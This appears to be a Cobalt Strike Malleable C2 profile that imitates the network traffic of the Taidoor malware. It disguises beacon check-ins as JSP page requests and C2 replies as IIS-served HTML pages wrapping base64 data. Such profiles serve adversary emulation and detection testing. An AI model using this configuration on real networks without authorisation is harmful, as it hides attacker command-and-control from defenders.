#
# Taidoor Profile
#   http://contagiodump.blogspot.com/2013/04/collection-of-pcap-files-from-malware.html
#
# Author: @harmj0y
#

set sleeptime "40000"; # use a ~40 second main interval
set jitter    "35"; # 35% jitter
set maxdns    "255";
set useragent "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)";

http-get {

    set uri "/login.jsp /parse.jsp /page.jsp /default.jsp /index.jsp /process.jsp /security.jsp /user.jsp";

    client {
        
        header "Connection" "Keep-Alive";
        header "Cache-Control" "no-cache";

        # encode session metadata
        metadata {
            netbiosu;
            parameter "mn";
        }
    }

    # no special server side indicators as the report didn't say anything one way
    # or the other about these.
    server {
        header "Server" "Microsoft-IIS/5.0";
        header "Content-Type" "text/html";
        header "Connection" "close";

        output {
            base64;
            prepend "<style>\n";
            prepend "<head>\n";
            prepend "<html dir=ltr>\n";
            prepend "<!DOCTYPE HTML PUBLIC -//W3C//DTD HTML 3.2 Final//EN>\n";
            append "\n</style>\n";
            append "</head>\n";
            append "</html>\n";
            print;
        }
    }
}

http-post {
    set uri "/submit.jsp";

    client {
        
        header "Connection" "Keep-Alive";
        header "Cache-Control" "no-cache";

        id {
            netbios;
            parameter "du";
        }

        output {
            print;
        }
    }

    server {
        header "Server" "Microsoft-IIS/5.0";
        header "Content-Type" "text/html";
        header "Connection" "close";

        output {
            print;
        }
    }
}

